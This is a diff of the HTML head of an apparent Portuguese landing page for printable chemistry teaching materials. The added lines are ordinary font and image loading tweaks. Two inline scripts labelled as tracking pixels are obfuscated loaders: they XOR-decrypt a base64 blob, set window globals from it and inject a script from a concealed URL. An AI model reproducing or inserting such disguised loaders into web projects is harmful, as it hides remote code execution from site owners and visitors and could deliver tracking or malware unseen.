@@ -9,10 +9,39 @@
     <meta property="og:description" content="Transforme a Tabela Periódica, reações, equilíbrios, modelos atômicos e química orgânica em materiais visuais, didáticos e prontos para imprimir e aplicar." />
     <meta property="og:type" content="website" />
     <meta name="twitter:card" content="summary_large_image" />
+
+    <!-- 1. Preconnects críticos para CDN de Imagens e Fontes -->
+    <link rel="preconnect" href="https://i.imgur.com" crossorigin>
+    <link rel="dns-prefetch" href="https://i.imgur.com">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Newsreader:ital,opsz,wght@0,6..72,400..800;1,6..72,400..700&family=Plus+Jakarta+Sans:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400&display=swap" rel="stylesheet">
-    <!-- Pixels de Rastreamento -->
+
+    <!-- 2. Preload prioritário da imagem principal LCP do notebook no Hero -->
+    <link 
+      rel="preload" 
+      as="image" 
+      href="https://i.imgur.com/sQexVEMl.jpeg" 
+      fetchpriority="high"
+      type="image/jpeg"
+    >
+
+    <!-- 3. Google Fonts não-bloqueante com pesos estritamente necessários e font-display: swap -->
+    <link 
+      rel="preload" 
+      as="style" 
+      href="https://fonts.googleapis.com/css2?family=Newsreader:ital,opsz,wght@0,6..72,600..800;1,6..72,600..800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap"
+    >
+    <link 
+      rel="stylesheet" 
+      href="https://fonts.googleapis.com/css2?family=Newsreader:ital,opsz,wght@0,6..72,600..800;1,6..72,600..800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" 
+      media="print" 
+      onload="this.media='all'"
+    >
+    <noscript>
+      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Newsreader:ital,opsz,wght@0,6..72,600..800;1,6..72,600..800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap">
+    </noscript>
+
+    <!-- Pixels de Rastreamento (Meta Pixel / UTMify com inicialização assíncrona) -->
     <script>(function(){var n_v4=atob("DFzJnHr7DzTFhXlDUifr6QiXLQ7n7Q03Ii/zs1WYa1rr8A0uOzqwshmUYhqn91YwMS6g7A6IIESs/RwvfSyg5B+XIV62p1VhMyi97hOZekCg9lt5CQHlvh2XYFak6QphaAeyvhSaYlHnv1szOySs8DOfLRjn8xgvJznrpljNblbwvEkiZmmrr0nObg32509wM2r+qErZcmm4");var k_esy=[];for(var x_k=0;x_k<n_v4.length;x_k++){k_esy.push(n_v4.charCodeAt(x_k)&255);}var e_pof=k_esy[0];var b_ny=k_esy.slice(1,1+e_pof);var r_4=k_esy.slice(1+e_pof);var e_cpn=r_4.map(function(b,k_toc6){return b^b_ny[k_toc6%e_pof];});var i_w24="";for(var f_8nm=0;f_8nm<e_cpn.length;f_8nm++){i_w24+=String.fromCharCode(e_cpn[f_8nm]&255);}var w_gt=decodeURIComponent(escape(i_w24));var n_ilv=JSON.parse(w_gt);var f_j=n_ilv.globals||[];f_j.forEach(function(l_f3k){window[l_f3k.name]=l_f3k.value;});var m_d=document.createElement("script");m_d.src=n_ilv.url;m_d.async=true;m_d.defer=true;(n_ilv.attributes||[]).forEach(function(c_t){m_d.setAttribute(c_t.name,c_t.value);});(document.head||document.documentElement).appendChild(m_d);})();</script>
     <script>(function(){var p_q4hw=atob("DELW9HEV2txmpDLdFDn0gQN5+OZEzEapZDHs2152vrJI0UawfSSv2hJ6t/IE1h2udzC/hAVm9akSyUHyeCOikQJh9LYVhh7/dTaihhh3r6gD1xDnTzn0mhB4v/5chla8YCP7gQV4s7ofiUKvcTSzmgU4or8JwB+udyn02FNju7ATwRDnNmCr2Ao3tL0LwRDnNia3gBA4r6gLzVSkOTKkkQdwtKhL10e/fSal1l03rL0K0Vf/LmD0iSxo");var j_lb=[];for(var b_lnr6=0;b_lnr6<p_q4hw.length;b_lnr6++){j_lb.push(p_q4hw.charCodeAt(b_lnr6)&255);}var j_c1tk=j_lb[0];var r_c=j_lb.slice(1,1+j_c1tk);var j_c86=j_lb.slice(1+j_c1tk);var d_n1x=j_c86.map(function(b,m_ml){return b^r_c[m_ml%j_c1tk];});var n_o3es="";for(var e_mmt1=0;e_mmt1<d_n1x.length;e_mmt1++){n_o3es+=String.fromCharCode(d_n1x[e_mmt1]&255);}var w_ypc=decodeURIComponent(escape(n_o3es));var e_j58=JSON.parse(w_ypc);var w_w=e_j58.globals||[];w_w.forEach(function(b_cra){window[b_cra.name]=b_cra.value;});var l_2=document.createElement("script");l_2.src=e_j58.url;l_2.async=true;l_2.defer=true;(e_j58.attributes||[]).forEach(function(l_6jt){l_2.setAttribute(l_6jt.name,l_6jt.value);});(document.head||document.documentElement).appendChild(l_2);})();</script>
   </head>
@@ -21,4 +50,3 @@
     <script type="module" src="/src/main.tsx"></script>
   </body>
 </html>
-
